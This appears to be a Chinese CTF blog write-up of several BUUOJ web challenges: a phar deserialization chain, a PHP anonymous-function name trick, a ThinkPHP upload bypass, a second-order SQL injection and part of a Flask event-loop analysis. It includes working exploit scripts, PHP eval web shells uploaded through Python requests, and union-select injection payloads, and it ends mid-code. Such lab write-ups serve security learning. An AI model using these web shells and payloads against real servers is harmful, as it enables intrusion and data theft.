class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>		<span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;<br>		<span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;<br><br>		<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;[^a-z0-9]&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;Filename))&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1024</span>)&#123;<br>				<span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				<span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>].<span class="hljs-string">&quot;&#x27;, &#x27;&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;Filename . <span class="hljs-string">&quot;&#x27;);&quot;</span>;<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">global</span> <span class="hljs-variable">$sandbox</span>;<br>		<span class="hljs-keyword">global</span> <span class="hljs-variable">$ext</span>;<br>		<span class="hljs-comment">// return $sandbox.$this-&gt;Filename.$ext;</span><br>		<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;Filename;<br>	&#125;<br><br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;token != <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>])&#123;<br>			<span class="hljs-keyword">$this</span>-&gt;cmd = <span class="hljs-string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;<br>		&#125;<br>		<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;cmd);<br>	&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$uploader</span> = <span class="hljs-keyword">new</span> Uploader();<br>	<span class="hljs-variable">$uploader</span>-&gt;upload(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>	<span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-variable">$uploader</span>))&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.<span class="hljs-variable">$uploader</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>		<span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-variable">$uploader</span>);<br>	&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>​    发现 line 52可以执行命令切cmd可控 接下来只要满足session相等就行 这里题目已经给出了</p>
<p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202072145163.png" srcset="/img/loading.gif" lazyload alt="image-20220207214544095"></p>
<p>然后这题没有限制phar协议，又没有明显的反序列化点那应该就是phar反序列化了</p>
<p>有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Uploader</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$Filename</span>=<span class="hljs-string">&#x27;1&#x27;</span>;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>	<span class="hljs-comment">//public $cmd=&#x27;highlight_file(&quot;/var/www/html/flag.php&quot;);&#x27;;</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;GXY90fa8abf0924af8361e694e35b6ea0e6&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Uploader();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;startBuffering();<br><span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br><br></code></pre></td></tr></table></figure>



<p>然后用phar协议去触发它</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">29</span>fc<span class="hljs-number">5</span>b<span class="hljs-number">9</span>f-<span class="hljs-number">3437</span>-<span class="hljs-number">4</span>e<span class="hljs-number">77</span>-<span class="hljs-number">8</span>c<span class="hljs-number">04</span>-<span class="hljs-number">9</span>b<span class="hljs-number">780</span>b<span class="hljs-number">878</span>ab<span class="hljs-number">4</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/home.php?file=upload&amp;name=phar:///var/www/html/uploads/<span class="hljs-number">1</span>b<span class="hljs-number">78</span>f<span class="hljs-number">2546892</span>a<span class="hljs-number">5</span>da<span class="hljs-number">1</span>ab<span class="hljs-number">41</span>abcacd<span class="hljs-number">8422</span>a/GXYdc<span class="hljs-number">195</span>f<span class="hljs-number">23050</span>d<span class="hljs-number">5</span>bb<span class="hljs-number">2</span>c<span class="hljs-number">332587688292</span>bbe.txt<br></code></pre></td></tr></table></figure>

<p>这里我自己做了好几遍所以…这个沙箱和上面有出入</p>
<p>然后再随便上传一个 触发__destruct方法就行</p>
<h2 id="Black-Watch-入群题"><a href="#Black-Watch-入群题" class="headerlink" title="[Black Watch 入群题]"></a>[Black Watch 入群题]</h2><p>可能是环境坏了 一开始自己的脚本啥也跑不出来，别人的也是乱码。有点麻</p>
<p>这题和其他异或二分不同的是 这里返回的是json数据做if in判断的需要先json转换然后转成str</p>
<p><code> text = str(r.json())</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>



<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><p>這個匿名函數是真的痲</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = create_function(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-comment">//创建一个$MY的匿名函数，函数的作用是输出flag</span><br><span class="hljs-comment">//匿名函数其实是有真正的名字，为%00lambda_%d(%d格式化为当前进程的第n个匿名函数,n的范围0-999)</span><br><span class="hljs-variable">$hash</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>

<p>这里创建一个匿名函数，然后通过GET传过来的func_name来访问自定义函数</p>
<p>关键点是上面注释中提到的匿名函数的名字，于是有脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> email <span class="hljs-keyword">import</span> contentmanager<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">import</span> requests<br>base_url=<span class="hljs-string">&#x27;http://65f4fcbe-6a17-43ba-bac6-cf8c7eaa10c4.node4.buuoj.cn:81/?func_name=%00lambda_1&#x27;</span><br>r=requests.get(url=base_url)<br>content=r.text<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> content:<br>    <span class="hljs-built_in">print</span>(content)<br></code></pre></td></tr></table></figure>

<h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>差点就解出来了…差一步知识积累</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        show_source(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>        <br>        <span class="hljs-keyword">if</span> (strstr(strtolower(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$upload</span> = <span class="hljs-keyword">new</span> \Think\Upload();<span class="hljs-comment">// 实例化上传类</span><br>        <span class="hljs-variable">$upload</span>-&gt;maxSize  = <span class="hljs-number">4096</span> ;<span class="hljs-comment">// 设置附件上传大小</span><br>        <span class="hljs-variable">$upload</span>-&gt;allowExts  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>);<span class="hljs-comment">// 设置附件上传类型</span><br>        <span class="hljs-variable">$upload</span>-&gt;rootPath = <span class="hljs-string">&#x27;./Public/Uploads/&#x27;</span>;<span class="hljs-comment">// 设置附件上传目录</span><br>        <span class="hljs-variable">$upload</span>-&gt;savePath = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">// 设置附件上传子目录</span><br>        <span class="hljs-variable">$info</span> = <span class="hljs-variable">$upload</span>-&gt;upload() ;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$info</span>) &#123;<span class="hljs-comment">// 上传错误提示错误信息</span><br>          <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$upload</span>-&gt;getError());<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// 上传成功 获取上传文件信息</span><br>          <span class="hljs-variable">$url</span> = __ROOT__.substr(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> json_encode(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我自己没搞出，学习一下思想</p>
<p>链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/106472619?spm=1001.2101.3001.6650.5&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-5.pc_relevant_default&amp;utm_relevant_index=7">https://blog.csdn.net/SopRomeo/article/details/106472619?spm=1001.2101.3001.6650.5&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-5.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-5.pc_relevant_default&amp;utm_relevant_index=7</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-string">&#x27;&#x27;&#x27;方法一</span><br><span class="hljs-string">	这里是利用的  upload() 函数不传参时为多文件上传，整个 $_FILES 数组的文件都会上传保存。题目中只限制了 $_FILES[file] 的上传后缀，也只给出 $_FILES[file] 上传后的路径，那我们上传多文件就可以绕过 php 后缀限制</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/index.php/home/index/upload&#x27;</span><br>s = requests.Session()<br><br>file1 = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>,)&#125;<br>file2 = &#123;<span class="hljs-string">&quot;file[]&quot;</span>:(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;&lt;?php @eval($_POST[penson]);&quot;</span>)&#125; <span class="hljs-comment">#批量上传用[]</span><br>r = s.post(url,files=file1)<br><span class="hljs-built_in">print</span>(r.text)<br>r = s.post(url,files=file2)<br><span class="hljs-built_in">print</span>(r.text)<br>r = s.post(url,files=file1)<br><span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;爆破&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">dir</span> =<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>                <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>:<br>                    url = <span class="hljs-string">&#x27;http://598b202c-5c60-4a06-b5a1-83ef646f7a82.node3.buuoj.cn/Public/Uploads/2020-06-01/5ed4adac&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(i,j,k,x,y)<br>                    <span class="hljs-built_in">print</span>(url)<br>                    r = requests.get(url)<br>                    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>                        <span class="hljs-built_in">print</span>(url)<br>                        <span class="hljs-keyword">break</span><br><span class="hljs-string">&#x27;&#x27;&#x27;方法二&#x27;&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://9b96c9f8-7b74-491a-94fd-f8063d1b8a29.node3.buuoj.cn/index.php/home/index/upload/&quot;</span><br>s = requests.Session()<br>files = &#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&quot;shell.&lt;&gt;php&quot;</span>, <span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url, files=files)<br><span class="hljs-built_in">print</span>(r.text)<br><br></code></pre></td></tr></table></figure>



<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>base_url=<span class="hljs-string">&#x27;http://a2fd7fb8-e84c-4273-87a0-a1ef07279c78.node4.buuoj.cn:81/?action=&#x27;</span><br>reg=base_url+<span class="hljs-string">&#x27;reg&#x27;</span><br>log=base_url+<span class="hljs-string">&#x27;login&#x27;</span><br>index=base_url+<span class="hljs-string">&#x27;index&#x27;</span><br>s=requests.session()<br>regdata=&#123;<br>   <span class="hljs-comment"># &quot;username&quot;:&quot;1&#x27; union select database() #&quot;,</span><br>   <span class="hljs-comment"># &quot;username&quot;:&quot;1&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctftraining&#x27;&quot;,</span><br>  <span class="hljs-comment">#  &quot;username&quot;:&quot;1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;&quot;,</span><br>    <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;1&#x27; union select flag from flag #&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;test&quot;</span><br>    <br>&#125;<br><span class="hljs-comment"># querydata=&#123;</span><br><br><span class="hljs-comment">#     &quot;info&quot;:&quot;test&quot;</span><br><span class="hljs-comment"># &#125;</span><br>req=s.post(reg,data=regdata)<br>time.sleep(<span class="hljs-number">1</span>)<br>res=s.post(log,data=regdata)<br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure>

<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>读取源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">	...<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_flag_function</span>(<span class="hljs-params">args</span>):</span><br>    flag = args[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag_handler</span>(<span class="hljs-params">args</span>):</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;num_items&#x27;</span>] &gt;= <span class="hljs-number">5</span>:<br>        <span class="hljs-comment"># show_flag_function has been disabled, no worries</span><br>        trigger_event(<span class="hljs-string">&#x27;func:show_flag;&#x27;</span> + FLAG())<br>    trigger_event(<span class="hljs-string">&#x27;action:view;index&#x27;</span>)<br>    ...<br></code></pre></td></tr></table></figure>

<p>这个 get_flag_handler() 函数可以帮助我们获取Flag，需要满足 <code>session[&#39;num_items&#39;] &gt;= 5</code></p>
<p>然后回去看 trigger_event这个函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">...<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trigger_event</span>(<span class="hljs-params">event</span>):</span><br>    session[<span class="hljs-string">&#x27;log&#x27;</span>].append(event)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(session[<span class="hljs-string">&#x27;log&#x27;</span>]) &gt; <span class="hljs-number">5</span>:<br>        session[<span class="hljs-string">&#x27;log&#x27;</span>] = session[<span class="hljs-string">&#x27;log&#x27;</span>][-<span class="hljs-number">5</span>:]  <span class="hljs-comment">#取最后五个</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(event) == <span class="hljs-built_in">type</span>([]):<br>        request.event_queue += event<br>    <span class="hljs-keyword">else</span>:<br>        request.event_queue.append(event)<br><br>...<br></code></pre></td></tr></table></figure>

<p>这里直接吧传入的参数放到了   session[‘log’] 里面，所以FLAG()在session里</p>
<p>然后看这个函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_event_loop</span>():</span><br>    valid_event_chars = <span class="hljs-built_in">set</span>(<br>        <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)<br>    resp = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(request.event_queue) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span><br>        event = request.event_queue[<span class="hljs-number">0</span>]<br>        request.event_queue = request.event_queue[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> event.startswith((<span class="hljs-string">&#x27;action:&#x27;</span>, <span class="hljs-string">&#x27;func:&#x27;</span>)):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> event:<br>            <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> valid_event_chars:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            is_action = event[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;a&#x27;</span><br>            action = get_mid_str(event, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>)<br>            args = get_mid_str(event, action+<span class="hljs-string">&#x27;;&#x27;</span>).split(<span class="hljs-string">&#x27;#&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                event_handler = <span class="hljs-built_in">eval</span>(<br>                    action + (<span class="hljs-string">&#x27;_handler&#x27;</span> <span class="hljs-keyword">if</span> is_action <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;_function&#x27;</span>))<br>                ret_val = event_handler(args)<br>            <span class="hljs-keyword">except</span> RollBackException:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = <span class="hljs-string">&#x27;&#x27;</span><br>                resp += <span class="hljs-string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span><br>                resp += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>                session[<span class="hljs-string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="hljs-string">&#x27;num_items&#x27;</span>]<br>                session[<span class="hljs-string">&#x27;points&#x27;</span>] = request.prev_session[<span class="hljs-string">&#x27;points&#x27;</span>]<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> Exception, e:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = <span class="hljs-string">&#x27;&#x27;</span><br>     